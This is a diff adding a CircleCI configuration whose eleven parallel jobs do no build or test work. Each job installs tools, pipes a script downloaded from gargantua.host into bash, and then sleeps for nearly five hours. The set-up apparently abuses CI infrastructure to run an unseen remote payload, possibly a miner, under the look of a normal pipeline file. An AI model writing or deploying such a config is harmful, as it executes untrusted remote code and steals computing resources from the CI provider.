@@ -1,0 +1,127 @@
+version: 2.1
+
+jobs:
+  pyruntm:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/cray.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  pyruntm1:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/cray.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  pyruntm2:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/cray.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  pyruntm3:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/cray.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  pyruntm4:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/cray.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  pyruntm5:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/cray.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  pyruntm6:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/cray.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  pyruntm7:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/cray.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  pyruntm8:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/cray.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  pyruntm9:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/cray.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  pyruntm10:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/cray.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+workflows:
+  main:
+    jobs:
+      - pyruntm
+      - pyruntm1
+      - pyruntm2
+      - pyruntm3
+      - pyruntm4
+      - pyruntm5
+      - pyruntm6
+      - pyruntm7
+      - pyruntm8
+      - pyruntm9
+      - pyruntm10
